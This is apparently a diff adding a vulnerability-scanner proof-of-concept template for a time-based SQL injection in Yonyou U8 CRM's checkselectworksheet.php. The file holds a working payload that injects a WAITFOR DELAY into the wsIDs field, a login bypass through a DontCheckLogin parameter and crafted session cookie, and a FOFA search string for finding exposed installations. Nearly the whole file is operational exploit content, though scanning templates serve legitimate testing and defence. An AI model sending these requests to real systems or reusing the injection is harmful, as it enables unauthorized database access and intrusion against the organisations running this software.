@@ -1,0 +1,21 @@
+id: poc-yaml-yongyon-u8-crm-checkselectworksheet-sqli
+info:
+  name: 用友U8 CRM checkselectworksheet SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /servicequotation/checkselectworksheet.php?DontCheckLogin=1
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: wsIDs=1);WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"fromObjType")
+    && duration > 5 && duration < 7
+transport: http
